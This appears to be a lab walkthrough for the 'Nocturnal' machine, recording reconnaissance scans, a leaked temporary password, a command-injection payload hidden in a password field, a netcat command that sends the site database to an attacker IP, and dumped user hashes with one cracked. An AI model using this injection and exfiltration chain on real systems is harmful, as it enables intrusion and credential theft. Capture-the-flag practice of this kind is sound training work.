### Scanning 
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:37 +0200
Nmap scan report for localhost (10.129.232.23)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
```

### Directories
```
ffuf -u "http://nocturnal.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt                                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
backups                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 19ms]
index.php               [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 22ms]
uploads                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 20ms]
:: Progress: [4750/4750] :: Job [1/1] :: 664 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

### Credentials
```
<text:p text:style-name="P1">Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.</text:p>

<text:p text:style-name="P1">The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.</text:p>

<text:p text:style-name="P1">Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.</text:p>

<text:p text:style-name="P1"/>

<text:p text:style-name="P1">Yours sincerely,</text:p>

<text:p text:style-name="P1">Nocturnal's IT team</text:p>
```


### Command Injection


```
password=test"ls%09-la"&backup=ls
```


### db
```
sudo nc -q 3 -lnvp 53 > nocturnal.db
```

```
nc -q 3 10.10.17.176 53 < /var/www/nocturnal_database/nocturnal_database.db
```

```
sqlite3 nocturnal.db 'SELECT * FROM users;'
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|test|098f6bcd4621d373cade4e832627b4f6
```

| Hash                             | Type | Result               |
| -------------------------------- | ---- | -------------------- |
| 55c82b1ccd55ab219b3b109b07d5061d | md5  | slowmotionapocalypse |
|                                  |      |                      |